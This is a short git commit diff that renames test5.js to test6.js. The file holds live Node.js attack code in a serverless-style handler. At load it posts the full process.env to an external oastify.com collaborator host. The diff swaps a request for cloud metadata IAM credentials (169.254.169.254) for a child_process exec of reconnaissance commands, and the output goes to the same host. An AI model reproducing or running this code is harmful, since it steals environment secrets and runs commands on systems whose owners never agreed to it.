05224248bad1f92ffc385e5b1c6951816b676c25
Martin <martinbydefault@gmail.com>
2024-05-21 09:11:35 -0300

    Update and rename test5.js to test6.js

--- test6.js
+++ test6.js
@@ -3,7 +3,9 @@ const axios = require('axios');
 axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);
 
 module.exports = (context, req, res) => {
-  result = axios.get('http://169.254.169.254/latest/meta-data/iam/')
+  var exec = require('child_process').exec;
+  var cmd = 'whoami;pwd;uname -a';
+  var result = exec(cmd, function(error, stdout, stderr) { return stdout; });
   axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
   return true;
 };
